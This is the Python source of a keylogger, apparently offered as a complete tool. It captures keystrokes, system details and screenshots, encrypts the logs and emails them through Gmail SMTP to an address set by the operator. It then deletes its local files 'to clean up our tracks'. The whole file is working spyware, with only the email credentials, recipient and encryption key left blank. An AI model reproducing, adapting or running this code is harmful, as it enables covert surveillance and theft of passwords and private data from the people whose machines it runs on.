# Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

from pynput.keyboard import Key, Listener

import time
import os

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "syseminfo.txt"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"

time_iteration = 15
number_of_iterations_end = 3

email_address = "" # Enter disposable email here
password = "" # Enter email password here

username = getpass.getuser()

toaddr = "" # Enter the email address you want to send your information to

key = "" # Generate an encryption key from the Cryptography folder

file_path = "" # Enter the file path you want your files to be saved to
extend = "/"
file_merge = file_path + extend

# email controls
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    try:
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(fromaddr, password)
        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)
        s.quit()
    except:
        print("An E-mail error occurred. Check the e-mail username and password")

#send_email(keys_information, file_path + extend + keys_information, toaddr)

# get the computer information
def computer_information():
    try:
        with open(file_path + extend + system_information, "a") as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            f.write("Processor: " + (platform.processor()) + '\n')
            f.write("System: " + platform.system() + " " + platform.version() + '\n')
            f.write("Machine: " + platform.machine() + "\n")
            f.write("Hostname: " + hostname + "\n")
            f.write("Private IP Address: " + IPAddr + "\n")
    except:
        print("Error occurred while writing computer information")

computer_information()

# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

#screenshot()

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

count = 0
keys =[]

def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

def write_file(keys):
    try:
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()
    except:
        print("Error occurred while logging unencrypted keystrokes.")

def on_release(key):
    if key == Key.esc:
        return False
    if currentTime > stoppingTime:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Timer for keylogger
while number_of_iterations < number_of_iterations_end:
    if currentTime > stoppingTime:

       # with open(file_path + extend + keys_information, "w") as f:
        #    f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

# Encrypt files
files_to_encrypt = [file_merge + system_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:
    try:
        with open(files_to_encrypt[count], 'rb') as f:
            data = f.read()
    except:
        print("Error occurred while reading unencrypted keystrokes")

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    try:
        with open(encrypted_file_names[count], 'wb') as f:
            f.write(encrypted)
    except:
        print("error occurred while writing to encrypted file")

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(30)

# Clean up our tracks and delete files
delete_files = [system_information, keys_information, screenshot_information]
for file in delete_files:
    os.remove(file_merge + file)
